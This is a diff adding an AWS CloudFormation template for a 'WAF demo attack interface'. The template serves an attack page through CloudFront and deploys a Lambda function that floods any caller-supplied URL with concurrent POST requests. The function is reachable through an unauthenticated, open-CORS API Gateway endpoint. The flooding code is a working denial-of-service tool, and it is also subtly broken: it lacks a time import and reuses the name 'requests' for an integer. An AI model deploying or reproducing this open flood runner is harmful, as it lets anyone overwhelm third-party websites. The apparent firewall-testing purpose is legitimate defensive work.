@@ -1,0 +1,287 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'CloudFormation template for WAF Demo Attack Interface'
+
+Parameters:
+  ProjectName:
+    Type: String
+    Default: waf-demo
+    Description: Base name for all resources
+
+  Stage:
+    Type: String
+    Default: demo
+    Description: Deployment stage (e.g., dev, test, demo)
+
+Resources:
+  # S3 bucket for attack files
+  AttackFiles:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub '${ProjectName}-attack-files-${Stage}'
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: true
+        BlockPublicPolicy: true
+        IgnorePublicAcls: true
+        RestrictPublicBuckets: true
+      VersioningConfiguration:
+        Status: Enabled
+
+  # CloudFront OAI for attack files
+  AttackFilesOAI:
+    Type: AWS::CloudFront::CloudFrontOriginAccessIdentity
+    Properties:
+      CloudFrontOriginAccessIdentityConfig:
+        Comment: !Sub 'OAI for ${ProjectName} attack files'
+
+  # CloudFront distribution for attack files
+  AttackFilesDistribution:
+    Type: AWS::CloudFront::Distribution
+    Properties:
+      DistributionConfig:
+        Enabled: true
+        DefaultRootObject: attack.html
+        Origins:
+          - DomainName: !GetAtt AttackFiles.DomainName
+            Id: S3Origin
+            S3OriginConfig:
+              OriginAccessIdentity: !Sub 'origin-access-identity/cloudfront/${AttackFilesOAI}'
+        DefaultCacheBehavior:
+          TargetOriginId: S3Origin
+          ViewerProtocolPolicy: redirect-to-https
+          AllowedMethods:
+            - GET
+            - HEAD
+          CachedMethods:
+            - GET
+            - HEAD
+          ForwardedValues:
+            QueryString: false
+            Cookies:
+              Forward: none
+          MinTTL: 0
+          DefaultTTL: 3600
+          MaxTTL: 86400
+        PriceClass: PriceClass_100
+        ViewerCertificate:
+          CloudFrontDefaultCertificate: true
+
+  # S3 bucket policy for attack files
+  AttackFilesBucketPolicy:
+    Type: AWS::S3::BucketPolicy
+    Properties:
+      Bucket: !Ref AttackFiles
+      PolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              CanonicalUser: !GetAtt AttackFilesOAI.S3CanonicalUserId
+            Action: s3:GetObject
+            Resource: !Sub 'arn:aws:s3:::${AttackFiles}/*'
+
+  # Add to attcf.yaml
+  AttackRunnerFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub '${ProjectName}-attack-runner-${Stage}'
+      Runtime: python3.9
+      Handler: index.lambda_handler
+      Role: !GetAtt AttackRunnerRole.Arn
+      MemorySize: 256
+      Timeout: 300
+      Code:
+        ZipFile: |
+          import json
+          import requests
+          import threading
+          from concurrent.futures import ThreadPoolExecutor
+          from datetime import datetime
+
+          def send_request(url, headers, count, delay=0):
+              try:
+                  response = requests.post(url, json={
+                      "product_id": "prod112",
+                      "review": "flood attack",
+                      "username": "attacker"
+                  }, headers=headers)
+                  return response.status_code
+              except Exception as e:
+                  return f"Error: {str(e)}"
+
+          def run_attack(url, num_requests, num_threads, delay=0):
+              headers = {
+                  'Content-Type': 'application/json'
+              }
+              
+              results = []
+              threads = []
+              
+              output = []
+              output.append(f"\nStarting flood attack at {datetime.now()}")
+              output.append(f"Target URL: {url}")
+              output.append(f"Number of requests: {num_requests}")
+              output.append(f"Number of threads: {num_threads}")
+              output.append(f"Delay between requests: {delay} seconds")
+              output.append("\nAttack in progress...")
+              
+              def worker():
+                  for _ in range(num_requests // num_threads):
+                      status = send_request(url, headers, 1, delay)
+                      results.append(status)
+                      if delay > 0:
+                          time.sleep(delay)
+              
+              # Start threads
+              with ThreadPoolExecutor(max_workers=num_threads) as executor:
+                  futures = [executor.submit(worker) for _ in range(num_threads)]
+                  for future in futures:
+                      future.result()
+              
+              # Analyze results
+              success_count = sum(1 for r in results if r == 200)
+              error_count = len(results) - success_count
+              
+              output.append("\nAttack completed!")
+              output.append(f"Total requests: {len(results)}")
+              output.append(f"Successful responses: {success_count}")
+              output.append(f"Failed responses: {error_count}")
+              
+              return {
+                  'total': len(results),
+                  'success': success_count,
+                  'failed': error_count,
+                  'output': '\n'.join(output)
+              }
+
+          def lambda_handler(event, context):
+              # Common CORS headers
+              cors_headers = {
+                  'Access-Control-Allow-Origin': '*',
+                  'Access-Control-Allow-Headers': 'Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,Origin,Accept',
+                  'Access-Control-Allow-Methods': 'POST,OPTIONS'
+              }
+
+              try:
+                  # Handle OPTIONS request
+                  if event.get('httpMethod') == 'OPTIONS':
+                      return {
+                          'statusCode': 200,
+                          'headers': cors_headers,
+                          'body': ''
+                      }
+
+                  body = json.loads(event['body'])
+                  url = body['url']
+                  requests = int(body['requests'])
+                  concurrent = int(body['concurrent'])
+                  
+                  result = run_attack(url, requests, concurrent)
+                  
+                  return {
+                      'statusCode': 200,
+                      'headers': cors_headers,
+                      'body': json.dumps(result)
+                  }
+              except Exception as e:
+                  return {
+                      'statusCode': 500,
+                      'headers': cors_headers,
+                      'body': json.dumps({
+                          'error': str(e)
+                      })
+                  }
+
+  AttackRunnerRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+
+  AttackApi:
+    Type: AWS::ApiGateway::RestApi
+    Properties:
+      Name: !Sub '${ProjectName}-attack-api-${Stage}'
+      EndpointConfiguration:
+        Types:
+          - REGIONAL
+
+  AttackApiResource:
+    Type: AWS::ApiGateway::Resource
+    Properties:
+      RestApiId: !Ref AttackApi
+      ParentId: !GetAtt AttackApi.RootResourceId
+      PathPart: run-attack
+
+  AttackApiMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      RestApiId: !Ref AttackApi
+      ResourceId: !Ref AttackApiResource
+      HttpMethod: POST
+      AuthorizationType: NONE
+      Integration:
+        Type: AWS_PROXY
+        IntegrationHttpMethod: POST
+        Uri: !Sub 'arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${AttackRunnerFunction.Arn}/invocations'
+        PassthroughBehavior: WHEN_NO_MATCH
+        ContentHandling: CONVERT_TO_TEXT
+
+  AttackApiOptionsMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      RestApiId: !Ref AttackApi
+      ResourceId: !Ref AttackApiResource
+      HttpMethod: OPTIONS
+      AuthorizationType: NONE
+      Integration:
+        Type: MOCK
+        IntegrationResponses:
+          - StatusCode: '200'
+            ResponseParameters:
+              method.response.header.Access-Control-Allow-Headers: "'Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,Origin,Accept'"
+              method.response.header.Access-Control-Allow-Methods: "'POST,OPTIONS'"
+              method.response.header.Access-Control-Allow-Origin: "'*'"
+            ResponseTemplates:
+              application/json: '{}'
+      MethodResponses:
+        - StatusCode: '200'
+          ResponseModels:
+            application/json: 'Empty'
+          ResponseParameters:
+            method.response.header.Access-Control-Allow-Headers: true
+            method.response.header.Access-Control-Allow-Methods: true
+            method.response.header.Access-Control-Allow-Origin: true
+
+  AttackApiDeployment:
+    Type: AWS::ApiGateway::Deployment
+    DependsOn:
+      - AttackApiMethod
+      - AttackApiOptionsMethod
+    Properties:
+      RestApiId: !Ref AttackApi
+      StageName: !Ref Stage
+      Description: !Sub 'Deployment for ${Stage} stage with CORS fix - ${AWS::StackName}-${AWS::Region}-${AWS::AccountId}-${AWS::StackId}'
+
+  AttackApiPermission:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt AttackRunnerFunction.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${AttackApi}/*/*/*'
+
+Outputs:
+  AttackFilesURL:
+    Description: URL of the attack interface
+    Value: !Sub 'https://${AttackFilesDistribution.DomainName}/attack.html'
+
+  AttackFilesBucketName:
+    Description: Name of the S3 bucket containing attack files
+    Value: !Ref AttackFiles
